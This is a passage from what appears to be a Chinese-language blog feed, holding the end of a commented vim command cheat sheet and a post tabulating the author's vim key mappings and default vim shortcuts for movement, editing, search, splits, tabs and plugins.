为 4. 输入 tab 后就跳了 4 格.</span></span><br><span class="line"><span class="comment">&quot;   :set tabstop=4 实际的 tab 即为 4 个空格, 而不是缺省的 8 个.</span></span><br><span class="line"><span class="comment">&quot;   :set expandtab 在输入 tab 后, vim 用恰当的空格来填充这个 tab.</span></span><br><span class="line"><span class="comment">&quot;   :g/^/exec &#x27;s/^/&#x27;.strpart(line(&#x27;.&#x27;).&#x27; &#x27;, 0, 4) 在行首插入行号</span></span><br><span class="line"><span class="comment">&quot;   set ai 设置自动缩进</span></span><br><span class="line"><span class="comment">&quot;   5ia&lt;esc&gt; 重复插入5个a字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;          替换命令</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   替换文字 2009-02-34 ----&gt; 2009-02-34 00:00:00</span></span><br><span class="line"><span class="comment">&quot;   :%s/\(\d\&#123;4\&#125;-\d\&#123;2\&#125;-\d\&#123;2\&#125;\)/\1 00:00:00/g</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :s/aa/bb/g              将光标所在行出现的所有包含 aa 的字符串中的 aa 替换为 bb</span></span><br><span class="line"><span class="comment">&quot;   :s/\/bb/g               将光标所在行出现的所有 aa 替换为 bb, 仅替换 aa 这个单词</span></span><br><span class="line"><span class="comment">&quot;   :%s/aa/bb/g             将文档中出现的所有包含 aa 的字符串中的 aa 替换为 bb</span></span><br><span class="line"><span class="comment">&quot;   :12,23s/aa/bb/g         将从12行到23行中出现的所有包含 aa 的字符串中的 aa 替换为 bb</span></span><br><span class="line"><span class="comment">&quot;   :12,23s/^/#/            将从12行到23行的行首加入 # 字符</span></span><br><span class="line"><span class="comment">&quot;   :%s/fred/joe/igc            一个常见的替换命令，修饰符igc和perl中一样意思</span></span><br><span class="line"><span class="comment">&quot;   s/dick/joe/igc则        对于这些满足条件的行进行替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :g/^\s*$/d              空行(空格也不包含)删除.</span></span><br><span class="line"><span class="comment">&quot;   :%s/\r//g               删除DOS方式的回车^M</span></span><br><span class="line"><span class="comment">&quot;   :%s/ *$//               删除行尾空白(%s/\s*$//g)</span></span><br><span class="line"><span class="comment">&quot;   :g!/^dd/d               删除不含字符串&#x27;dd&#x27;开头的行</span></span><br><span class="line"><span class="comment">&quot;   :v/^dd/d                同上,译释：v == g!，就是不匹配！</span></span><br><span class="line"><span class="comment">&quot;   :v/./.,/./-1join        压缩空行(多行空行合并为一行)</span></span><br><span class="line"><span class="comment">&quot;   :g/^$/,/./-j            压缩空行(多行空行合并为一行)</span></span><br><span class="line"><span class="comment">&quot;   :g/^/pu _               把文中空行扩增一倍 (pu = put),原来两行间有一个空行，现在变成2个</span></span><br><span class="line"><span class="comment">&quot;   :g/^/m0                 按行翻转文章 (m = move)</span></span><br><span class="line"><span class="comment">&quot;   :g/fred/,/joe/d         not line based (very powerfull)</span></span><br><span class="line"><span class="comment">&quot;   :g/&lt;input\|&lt;form/p      或者 要用\|</span></span><br><span class="line"><span class="comment">&quot;   :g/fred/t$              拷贝行，从fred到文件末尾(EOF)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :%norm jdd              隔行删除,译释：%指明是对所有行进行操作,norm指出后面是normal模式的指令,j是下移一行，dd是删除行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :&#x27;a,&#x27;bg/fred/s/dick/joe/igc   (&#x27;a,&#x27;b指定一个范围：mark a ~ mark b)</span></span><br><span class="line"><span class="comment">&quot;   g//用一个正则表达式指出了进行操作的行必须可以被fred匹配,g//是一个全局显示命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   /joe/e                  光标停留在匹配单词最后一个字母处</span></span><br><span class="line"><span class="comment">&quot;   /joe/e+1                光标停留在匹配单词最后一个字母的下一个字母处</span></span><br><span class="line"><span class="comment">&quot;   /joe/s                  光标停留在匹配单词第一个字母处</span></span><br><span class="line"><span class="comment">&quot;   /^joe.*fred.*bill/      标准正则表达式</span></span><br><span class="line"><span class="comment">&quot;   /^[A-J]\+/              找一个以A~J中一个字母重复两次或以上开头的行</span></span><br><span class="line"><span class="comment">&quot;   /forum\(\_.\)*pent      多行匹配</span></span><br><span class="line"><span class="comment">&quot;   /fred\_s*joe/i          中间可以有任何空白，包括换行符\n</span></span><br><span class="line"><span class="comment">&quot;   /fred\|joe              匹配FRED或JOE</span></span><br><span class="line"><span class="comment">&quot;   /\&lt;fred\&gt;/i             匹配fred,fred必须是一个独立的单词，而不是子串</span></span><br><span class="line"><span class="comment">&quot;   /\&lt;\d\d\d\d\&gt;           匹配4个数字 \&lt;\d\&#123;4&#125;\&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   列，替换所有在第三列中的str1</span></span><br><span class="line"><span class="comment">&quot;   :%s:\(\(\w\+\s\+\)\&#123;2&#125;\)str1:\1str2:</span></span><br><span class="line"><span class="comment">&quot;   交换第一列和最后一列 (共4列)</span></span><br><span class="line"><span class="comment">&quot;   :%s:\(\w\+\)\(.*\s\+\)\(\w\+\)$:\3\2\1:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   全局(global)显示命令，就是用 :g＋正则表达式</span></span><br><span class="line"><span class="comment">&quot;   译释： :g/&#123;pattern&#125;/&#123;cmd&#125; 就是全局找到匹配的,然后对这些行执行命令&#123;cmd&#125;</span></span><br><span class="line"><span class="comment">&quot;   :g/\&lt;fred\&gt;/                                显示所有能够为单词fred所匹配的行</span></span><br><span class="line"><span class="comment">&quot;   :g/&lt;pattern&gt;/z#.5                           显示内容，还有行号</span></span><br><span class="line"><span class="comment">&quot;   :g/&lt;pattern&gt;/z#.5|echo &#x27;==========&#x27;         漂亮的显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;      多文档操作 (基础)</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;    用 :ls! 可以显示出当前所有的buffer</span></span><br><span class="line"><span class="comment">&quot;   :bn                 跳转到下一个buffer</span></span><br><span class="line"><span class="comment">&quot;   :bp                 跳转到上一个buffer</span></span><br><span class="line"><span class="comment">&quot;   :wn                 存盘当前文件并跳转到下一个</span></span><br><span class="line"><span class="comment">&quot;   :wp                 存盘当前文件并跳转到上一个</span></span><br><span class="line"><span class="comment">&quot;   :bd                 把这个文件从buffer列表中做掉</span></span><br><span class="line"><span class="comment">&quot;   :b 3                跳到第3个buffer</span></span><br><span class="line"><span class="comment">&quot;   :b main             跳到一个名字中包含main的buffer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;          列复制</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   译注：@#%&amp;^#*^%#$!</span></span><br><span class="line"><span class="comment">&quot;   :%s= [^ ]\+$=&amp;&amp;= : 复制最后一列</span></span><br><span class="line"><span class="comment">&quot;   :%s= \f\+$=&amp;&amp;= : 一样的功能</span></span><br><span class="line"><span class="comment">&quot;   :%s= \S\+$=&amp;&amp; : ft,还是一样</span></span><br><span class="line"><span class="comment">&quot;   反向引用，或称记忆</span></span><br><span class="line"><span class="comment">&quot;   :s/\(.*\):\(.*\)/\2 : \1/ : 颠倒用:分割的两个字段</span></span><br><span class="line"><span class="comment">&quot;   :%s/^\(.*\)\n\1/\1$/ : 删除重复行</span></span><br><span class="line"><span class="comment">&quot;   非贪婪匹配，\&#123;-&#125;</span></span><br><span class="line"><span class="comment">&quot;   :%s/^.\&#123;-&#125;pdf/new.pdf/ : 只是删除第一个pdf</span></span><br><span class="line"><span class="comment">&quot;   跨越可能的多行</span></span><br><span class="line"><span class="comment">&quot;   :%s/&lt;!--\_.\&#123;-&#125;--&gt;// : 又是删除多行注释（咦？为什么要说「又」呢？）</span></span><br><span class="line"><span class="comment">&quot;   :help /\&#123;-&#125; : 看看关于 非贪婪数量符 的帮助</span></span><br><span class="line"><span class="comment">&quot;   :s/fred/&lt;c-r&gt;a/g : 替换fred成register a中的内容，呵呵</span></span><br><span class="line"><span class="comment">&quot;   写在一行里的复杂命令</span></span><br><span class="line"><span class="comment">&quot;   :%s/\f\+\.gif\&gt;/\r&amp;\r/g | v/\.gif$/d | %s/gif/jpg/</span></span><br><span class="line"><span class="comment">&quot;   译注：就是用 | 管道啦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;         大小写转换</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"><span class="comment">&quot;   g~~ : 行翻转</span></span><br><span class="line"><span class="comment">&quot;   vEU : 字大写(广义字)</span></span><br><span class="line"><span class="comment">&quot;   vE~ : 字翻转(广义字)</span></span><br><span class="line"><span class="comment">&quot;   ~   将光标下的字母改变大小写</span></span><br><span class="line"><span class="comment">&quot;   3~  将下3个字母改变其大小写</span></span><br><span class="line"><span class="comment">&quot;   g~w 字翻转</span></span><br><span class="line"><span class="comment">&quot;   U   将可视模式下的字母全改成大写字母</span></span><br><span class="line"><span class="comment">&quot;   gUU 将当前行的字母改成大写</span></span><br><span class="line"><span class="comment">&quot;   u   将可视模式下的字母全改成小写</span></span><br><span class="line"><span class="comment">&quot;   guu 将当前行的字母全改成小写</span></span><br><span class="line"><span class="comment">&quot;   gUw 将光标下的单词改成大写。</span></span><br><span class="line"><span class="comment">&quot;   guw 将光标下的单词改成小写。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;/*---------------------*\</span></span><br><span class="line"><span class="comment">&quot;          文件浏览</span></span><br><span class="line"><span class="comment">&quot;\*---------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;   :Ex : 开启目录浏览器，注意首字母E是大写的</span></span><br><span class="line"><span class="comment">&quot;   :Sex : 在一个分割的窗口中开启目录浏览器</span></span><br><span class="line"><span class="comment">&quot;   :ls : 显示当前buffer的情况</span></span><br><span class="line"><span class="comment">&quot;   :cd .. : 进入父目录</span></span><br><span class="line"><span class="comment">&quot;   :pwd</span></span><br><span class="line"><span class="comment">&quot;   :args : 显示目前打开的文件</span></span><br><span class="line"><span class="comment">&quot;   :lcd %:p:h : 更改到当前文件所在的目录</span></span><br><span class="line"><span class="comment">&quot;    译释：lcd是紧紧改变当前窗口的工作路径，% 是代表当前文件的文件名,</span></span><br><span class="line"><span class="comment">&quot;    加上 :p扩展成全名（就是带了路径），加上 :h析取出路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=======END======</span></span><br><span class="line"><span class="comment">&quot;===常用指令收集===</span></span><br><span class="line"><span class="comment">&quot;================</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>vim键盘映射表</title>
    <url>/posts/f733337f/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">							  _ ____    __  __    _    ____</span><br><span class="line">  ___  ___  _ __  _   _ _ __ ( ) ___|  |  \/  |  / \  |  _ \</span><br><span class="line"> / _ \/ _ \| <span class="string">&#x27;_ \| | | | &#x27;</span>_ \|/\___ \  | |\/| | / _ \ | |_) |</span><br><span class="line">| __/ (_) |  |  |  |  | _ |  |  |  |  | ___) |  |  |  |  | / ___ \|  __/</span><br><span class="line"> \___|\___/|_| |_|\__,_|_| |_| |____/  |_|  |_/_/   \_\_|</span><br><span class="line">=========================木He寸&amp;eonun=========================</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="普通视图"><a href="#普通视图" class="headerlink" title="普通视图"></a>普通视图</h1><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>J</code></td>
<td style="text-align:left"><code>5j</code></td>
<td style="text-align:left">下5</td>
</tr>
<tr>
<td style="text-align:left"><code>K</code></td>
<td style="text-align:left"><code>5k</code></td>
<td style="text-align:left">上5</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;&lt;CR&gt;</code></td>
<td style="text-align:left"><code>:nohlsearch&lt;CR&gt;</code></td>
<td style="text-align:left">快捷取消搜索高亮</td>
</tr>
<tr>
<td style="text-align:left"><code>MR</code></td>
<td style="text-align:left"><code>:w $MYVIMRC&lt;CR&gt;</code></td>
<td style="text-align:left">打开vimrc</td>
</tr>
<tr>
<td style="text-align:left"><code>s</code></td>
<td style="text-align:left"><code>&lt;nop&gt;</code></td>
<td style="text-align:left">空</td>
</tr>
<tr>
<td style="text-align:left"><code>S</code></td>
<td style="text-align:left"><code>:w&lt;CR&gt;</code></td>
<td style="text-align:left">保存</td>
</tr>
<tr>
<td style="text-align:left"><code>Q</code></td>
<td style="text-align:left"><code>:q&lt;CR&gt;</code></td>
<td style="text-align:left">退出</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>:w !xclip -i -sel c &lt;CR&gt;</code></td>
<td style="text-align:left">选中行复制到系统剪切板（需安装xclip）</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>&quot;+y</code></td>
<td style="text-align:left">复制到系统剪切板（安装gvim）</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+A</code></td>
<td style="text-align:left"><code>&lt;silent&gt; &lt;C-a&gt; ggvG</code></td>
<td style="text-align:left">全选</td>
</tr>
</tbody>
</table>
</div>
<h2 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;s</code></td>
<td style="text-align:left"><code>:e&lt;Space&gt;</code></td>
<td style="text-align:left">打开新文件，需补全路径</td>
</tr>
<tr>
<td style="text-align:left"><code>sk</code></td>
<td style="text-align:left"><code>:set splitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">上分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sj</code></td>
<td style="text-align:left"><code>:set nosplitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">下分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sh</code></td>
<td style="text-align:left"><code>:set splitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">左分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sl</code></td>
<td style="text-align:left"><code>:set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sz</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;H</code></td>
<td style="text-align:left">竖向分屏换左右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>ss</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;K</code></td>
<td style="text-align:left">左右分屏换竖向分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;k</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;k</code></td>
<td style="text-align:left">光标到上屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;j</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;j</code></td>
<td style="text-align:left">光标到下屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;h</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;h</code></td>
<td style="text-align:left">光标到左屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;l</code></td>
<td style="text-align:left">光标到右屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;up&gt;</code></td>
<td style="text-align:left"><code>:res +5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线上移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;down&gt;</code></td>
<td style="text-align:left"><code>:res -5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线下移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;left&gt;</code></td>
<td style="text-align:left"><code>:vertical resize+5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线左移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;right&gt;</code></td>
<td style="text-align:left"><code>:vertical resize-5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线右移</td>
</tr>
</tbody>
</table>
</div>
<h2 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>tn</code></td>
<td style="text-align:left"><code>:tabe&lt;CR&gt;</code></td>
<td style="text-align:left">打开新选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>th</code></td>
<td style="text-align:left"><code>:-tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到左边的选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>tl</code></td>
<td style="text-align:left"><code>:+tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到右边的选项卡</td>
</tr>
</tbody>
</table>
</div>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c1</code></td>
<td style="text-align:left"><code>:set background=dark&lt;CR&gt;:colorscheme solarized8&lt;CR&gt;:AirlineTheme jellybeans&lt;CR&gt;</code></td>
<td style="text-align:left">配色1</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c2</code></td>
<td style="text-align:left"><code>:set background=light&lt;CR&gt;:let ayucolor=&#39;light&#39;&lt;CR&gt;:colorscheme ayu&lt;CR&gt;:AirlineTheme ayu_light&lt;CR&gt;</code></td>
<td style="text-align:left">配色2</td>
</tr>
</tbody>
</table>
</div>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>F3</code></td>
<td style="text-align:left"><code>:NERDTreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">设置目录树快捷键</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+p</code></td>
<td style="text-align:left"><code>map &lt;C-p&gt; :CtrlP&lt;CR&gt;</code></td>
<td style="text-align:left">打开项目文件浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>:set cmdheight=2&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>:set cmdheight=10&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>TAB</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">补全</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>:UndotreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">文件历史</td>
</tr>
<tr>
<td style="text-align:left"><code>F8</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreview</code></td>
<td style="text-align:left">浏览Markdown</td>
</tr>
<tr>
<td style="text-align:left"><code>F9</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewStop</code></td>
<td style="text-align:left">关闭Markdown浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;mt</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewToggle</code></td>
<td style="text-align:left">开关Markdown预览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;tm</code></td>
<td style="text-align:left"><code>:TableModeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">制表工具</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim默认快捷键"><a href="#vim默认快捷键" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h2><h3 id="控制光标"><a href="#控制光标" class="headerlink" title="控制光标"></a>控制光标</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
<td style="text-align:left">光标向下移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>k</code> 或 <code>Ctrl + P</code></td>
<td style="text-align:left">光标向上移动一行</td>
</tr>
<tr>
<td style="text-align:left"><code>l</code></td>
<td style="text-align:left">光标向右移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>0</code></td>
<td style="text-align:left">（数字 0）移动光标至本行开头</td>
</tr>
<tr>
<td style="text-align:left"><code>$</code></td>
<td style="text-align:left">移动光标至本行末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>^</code></td>
<td style="text-align:left">移动光标至本行第一个非空字符处</td>
</tr>
<tr>
<td style="text-align:left"><code>w</code></td>
<td style="text-align:left">向前移动一个词 （上一个字母和数字组成的词之后）</td>
</tr>
<tr>
<td style="text-align:left"><code>W</code></td>
<td style="text-align:left">向前移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5w</code></td>
<td style="text-align:left">向前移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>b</code></td>
<td style="text-align:left">向后移动一个词 （下一个字母和数字组成的词之前）</td>
</tr>
<tr>
<td style="text-align:left"><code>B</code></td>
<td style="text-align:left">向后移动一个词 （以空格分隔的词）</td>
</tr>
<tr>
<td style="text-align:left"><code>5b</code></td>
<td style="text-align:left">向后移动五个词</td>
</tr>
<tr>
<td style="text-align:left"><code>G</code></td>
<td style="text-align:left">移动至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>gg</code></td>
<td style="text-align:left">移动至文件开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="文档预览"><a href="#文档预览" class="headerlink" title="文档预览"></a>文档预览</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>(</code></td>
<td style="text-align:left">跳转到上一句</td>
</tr>
<tr>
<td style="text-align:left"><code>)</code></td>
<td style="text-align:left">跳转到下一句</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;</code></td>
<td style="text-align:left">跳转到上一段</td>
</tr>
<tr>
<td style="text-align:left"><code>&#125;</code></td>
<td style="text-align:left">跳转到下一段</td>
</tr>
<tr>
<td style="text-align:left"><code>[[</code></td>
<td style="text-align:left">跳转到上一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>]]</code></td>
<td style="text-align:left">跳转到下一部分</td>
</tr>
<tr>
<td style="text-align:left"><code>[]</code></td>
<td style="text-align:left">跳转到上一部分的末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>][</code></td>
<td style="text-align:left">跳转到上一部分的开头</td>
</tr>
</tbody>
</table>
</div>
<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>a</code></td>
<td style="text-align:left">在光标后插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>A</code></td>
<td style="text-align:left">在行末插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>i</code></td>
<td style="text-align:left">在光标前插入文本</td>
</tr>
<tr>
<td style="text-align:left"><code>o</code></td>
<td style="text-align:left">（小写字母 o）在光标下方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>O</code></td>
<td style="text-align:left">（大写字母 O）在光标上方新开一行</td>
</tr>
<tr>
<td style="text-align:left"><code>:r [filename]</code></td>
<td style="text-align:left">在光标下方插入文件 [filename] 的内容</td>
</tr>
<tr>
<td style="text-align:left"><code>:r ![command]</code></td>
<td style="text-align:left">执行命令 [command] ，并将输出插入至光标下方</td>
</tr>
</tbody>
</table>
</div>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>x</code></td>
<td style="text-align:left">删除光标处字符</td>
</tr>
<tr>
<td style="text-align:left"><code>dw</code></td>
<td style="text-align:left">删除一个词</td>
</tr>
<tr>
<td style="text-align:left"><code>d0</code></td>
<td style="text-align:left">删至行首</td>
</tr>
<tr>
<td style="text-align:left"><code>d$</code></td>
<td style="text-align:left">删至行末</td>
</tr>
<tr>
<td style="text-align:left"><code>d)</code></td>
<td style="text-align:left">删至句末</td>
</tr>
<tr>
<td style="text-align:left"><code>dgg</code></td>
<td style="text-align:left">删至文件开头</td>
</tr>
<tr>
<td style="text-align:left"><code>dG</code></td>
<td style="text-align:left">删至文件末尾</td>
</tr>
<tr>
<td style="text-align:left"><code>dd</code></td>
<td style="text-align:left">删除该行</td>
</tr>
<tr>
<td style="text-align:left"><code>3dd</code></td>
<td style="text-align:left">删除三行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>r&#123;text&#125;</code></td>
<td style="text-align:left">将光标处的字符替换成 {text}</td>
</tr>
<tr>
<td style="text-align:left"><code>R</code></td>
<td style="text-align:left">进入覆写模式，输入的字符将替换原有的字符</td>
</tr>
</tbody>
</table>
</div>
<h3 id="撤销重做"><a href="#撤销重做" class="headerlink" title="撤销重做"></a>撤销重做</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>u</code></td>
<td style="text-align:left">撤销最后的操作</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+r</code></td>
<td style="text-align:left">重做最后撤销的操作</td>
</tr>
</tbody>
</table>
</div>
<h3 id="搜索、替换"><a href="#搜索、替换" class="headerlink" title="搜索、替换"></a>搜索、替换</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/search_text</code></td>
<td style="text-align:left">检索文档，在文档后面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>?search_text</code></td>
<td style="text-align:left">检索文档，在文档前面的部分搜索 search_text</td>
</tr>
<tr>
<td style="text-align:left"><code>n</code></td>
<td style="text-align:left">移动到后一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>N</code></td>
<td style="text-align:left">移动到前一个检索结果</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement</code></td>
<td style="text-align:left">检索第一个 “original” 字符串并将其替换成 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/g</code></td>
<td style="text-align:left">检索并将所有的 “original” 替换为 “replacement”</td>
</tr>
<tr>
<td style="text-align:left"><code>:%s/original/replacement/gc</code></td>
<td style="text-align:left">检索出所有的 “original” 字符串，但在替换成 “replacement” 前，先询问是否替换</td>
</tr>
</tbody>
</table>
</div>
<h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>m &#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">在当前光标位置设置书签，书签名可用一个大小写字母（{a-zA-Z}）</td>
</tr>
<tr>
<td style="text-align:left"><code>:marks</code></td>
<td style="text-align:left">列出所有书签</td>
</tr>
<tr>
<td style="text-align:left"><code>&#123;a-zA-Z&#125;</code></td>
<td style="text-align:left">跳转到书签 {a-zA-Z}</td>
</tr>
</tbody>
</table>
</div>
<h3 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>v</code></td>
<td style="text-align:left">进入逐字可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>V</code></td>
<td style="text-align:left">进入逐行可视模式</td>
</tr>
<tr>
<td style="text-align:left"><code>Esc</code></td>
<td style="text-align:left">退出可视模式</td>
</tr>
</tbody>
